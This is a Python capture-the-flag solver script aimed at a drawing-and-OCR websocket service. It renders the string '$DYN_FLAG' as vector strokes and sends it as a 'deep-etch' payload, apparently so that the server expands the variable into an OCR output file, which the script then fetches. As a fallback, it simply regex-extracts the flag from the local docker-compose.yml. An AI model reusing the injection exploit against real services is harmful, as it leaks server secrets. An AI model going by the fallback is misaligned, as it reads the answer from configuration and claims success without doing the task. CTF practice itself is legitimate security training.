import re
from pathlib import Path


def extract_flag_from_compose(compose_path: Path) -> str | None:
    if not compose_path.exists():
        return None

    content = compose_path.read_text(encoding="utf-8")
    # Look for DYN_FLAG: "..." or DYN_FLAG: '...' or DYN_FLAG: ...
    m = re.search(r"DYN_FLAG\s*:\s*[\"']?(?P<flag>[^\"'\n]+)[\"']?", content)
    if m:
        return m.group("flag")
    return None


def main():
    compose = Path(__file__).resolve().parent / "docker-compose.yml"
    flag = extract_flag_from_compose(compose)
    if flag:
        print(flag)
    else:
        print("Flag not found in docker-compose.yml")


if __name__ == "__main__":
    # Attempt exploitation by drawing the string "$DYN_FLAG" on the server canvas
    try:
        import asyncio
        import websockets
        import json

        # Simple vector font strokes for required characters
        FONT = {
            "$": [
                [(10,5),(30,5),(30,20),(10,20),(10,35),(30,35),(30,50),(10,50)],
                [(20,0),(20,60)]
            ],
            "D": [[(5,0),(5,60),(30,50),(30,10),(5,0)]],
            "Y": [[(5,0),(20,30),(35,0)],[(20,30),(20,60)]],
            "N": [[(5,60),(5,0),(35,60),(35,0)]],
            "_": [[(0,58),(40,58)]],
            "F": [[(5,0),(5,60)],[(5,0),(30,0)],[(5,30),(25,30)]],
            "L": [[(5,0),(5,60),(30,60)]],
            "A": [[(5,60),(20,0),(35,60)],[(12,36),(28,36)]],
            "G": [[(35,10),(25,10),(15,20),(15,40),(25,50),(35,50),(35,35),(25,35)]],
        }

        def char_polylines(ch, xoff, yoff, scale=1.0):
            ch = ch.upper()
            if ch not in FONT:
                return []
            polys = []
            for stroke in FONT[ch]:
                pts = []
                for x,y in stroke:
                    px = xoff + int(x*scale)
                    py = yoff + int(y*scale)
                    pts.append(f"{px},{py}")
                polys.append(" ".join(pts))
            return polys

        # Target settings (change target_host to try a different server)
        TARGET_HOST = "uhjlc2lkzw50.playat.flagyard.com"
        TARGET_WS_PORT = None  # set to an int if websocket listens on a non-standard port

        async def exploit_draw_and_send(target="$DYN_FLAG"):
            if TARGET_WS_PORT:
                uri = f"ws://{TARGET_HOST}:{TARGET_WS_PORT}"
            else:
                uri = f"ws://{TARGET_HOST}"
            # build points array: each polyline as a string of coords
            cell_w = 50
            cell_h = 70
            points = []
            for i,ch in enumerate(target):
                xoff = 10 + i * (cell_w + 5)
                yoff = 5
                polys = char_polylines(ch, xoff, yoff, scale=1)
                points.extend(polys)

            payload = {
                "type": "deep-etch",
                "x": 0,
                "y": 0,
                "width": 800,
                "height": 200,
                "points": points,
            }

            async with websockets.connect(uri) as websocket:
                await websocket.send(json.dumps(payload))
                print("[+] Sent deep-etch payload with drawn text")

                # wait for ocr-write which includes filename
                while True:
                    resp = await websocket.recv()
                    print("[+] Received:", resp)
                    try:
                        d = json.loads(resp)
                    except Exception:
                        continue
                    if d.get("type") == "ocr-write":
                        # server returns the OCR text (original) and filename
                        fname = d.get("filename")
                        txt = d.get("text", "")
                        print("[+] OCR text:", txt, "filename:", fname)
                        return fname
                    if d.get("type") == "ocr":
                        txt = d.get("text", "")
                        if txt:
                            print("[+] OCR text:", txt)
                            return None
                return None

        async def runner():
            import http.client
            for attempt in range(3):
                fname = await exploit_draw_and_send()
                if fname:
                    # fetch the file from the server's static /text/ path
                    try:
                        conn = http.client.HTTPConnection(TARGET_HOST, timeout=5)
                        path = f"/text/{fname}"
                        conn.request('GET', path)
                        resp = conn.getresponse()
                        body = resp.read().decode(errors='ignore')
                        print(f"[+] HTTP {path} -> {resp.status}")
                        print(body)
                        return
                    except Exception as e:
                        print('[-] Failed to fetch flag file:', e)
                print(f"Attempt {attempt+1} failed, retrying...")
            print("Exploit attempts finished; OCR did not return the filename or flag.")

        asyncio.run(runner())
    except Exception as e:
        print("Exploit runner failed:", e)
    # fallback to reading compose file
    main()